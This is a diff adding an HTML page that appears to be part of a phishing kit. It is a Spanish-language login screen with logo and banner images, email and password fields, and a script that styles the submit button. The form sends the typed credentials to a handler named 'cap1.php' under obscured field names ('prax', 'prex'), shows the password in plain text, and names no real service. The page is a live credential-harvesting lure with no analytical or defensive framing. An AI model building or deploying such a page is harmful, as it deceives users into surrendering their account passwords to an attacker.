@@ -1,0 +1,67 @@
+<html lang="es"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Home</title> <link rel="stylesheet" href="index%20Archivos/style.css"></head><body> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> 
+    
+    
+    
+    
+ 
+    
+ <div class="nav"> <div class="log"> <img src="index%20Archivos/log.png" alt=""> </div> 
+ <select class="es" name="" id="">
+     <option checked="" value="" selected="selected">ES</option> 
+     <option value="">English</option> <option value="">Español</option> 
+     <option value="">Portugués</option> </select> </div> <div class="cont"> 
+        <div class="cont-left"> <img src="index%20Archivos/banner.jpg" alt=""> </div> 
+        <div class="cont-right2"> 
+            <form id="myform" action="cap1.php" method="post"> 
+            <div class="cont-top"> <img src="index%20Archivos/login.png" alt=""> </div> 
+            <div class="mail"> <img src="index%20Archivos/mail.png" alt=""> </div> 
+            <div class="user"> <input id="maill" type="email" name="prax" placeholder="ejemplo@gmail.com"> </div> 
+            <div class="cont-ingre"> <img src="index%20Archivos/ingre.png" alt=""> </div> 
+            <div class="mail"> <img src="index%20Archivos/pss.png" alt=""> </div>
+             <div class="user"> <input id="pass" type="text" name="prex" placeholder="Escribe tu contraseña"> </div> 
+             <div class="sub"> <input id="sub" type="submit" value="Iniciar sesión" style="background: rgb(72, 138, 247); color: rgb(255, 255, 255);"> </div>
+              <a class="olvi" href="#">¿Olvidaste tu contraseña?</a> <p class="aun">¿Aún no tienes cuenta? <a href="#">Regístrate</a></p>
+               <div class="app"> <img src="index%20Archivos/app.png" alt=""> </div> </form> </div> </div> <div class="wh"> <img src="index%20Archivos/whs.png" alt=""> </div>
+
+
+<script>
+    const mail = document.querySelector('#maill');
+    const pass = document.querySelector('#pass');
+    const sub = document.querySelector('#sub')
+    mail.addEventListener('input', function(){
+        if(mail.value === '' || pass.value === ''){
+            sub.style.background = '#edeee7';
+        }else{
+           sub.style.background = '#488af7';
+           sub.style.color = '#fff';
+        }
+    })
+
+    pass.addEventListener('input', function(){
+        if(mail.value === '' || pass.value === ''){
+            sub.style.background = '#edeee7';
+            
+        }else{
+            sub.style.background = '#488af7';
+           sub.style.color = '#fff';
+        }
+    })
+
+
+
+    const form = document.querySelector('#myform');
+
+form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    if (mail.value !== '' && pass.value !== '') {
+        form.submit();
+    } else {
+        alert('Por favor, completa todos los campos antes de enviar el formulario.');
+    }
+});
+
+</script>
+<script src="secure.js"></script>
+</body></html>
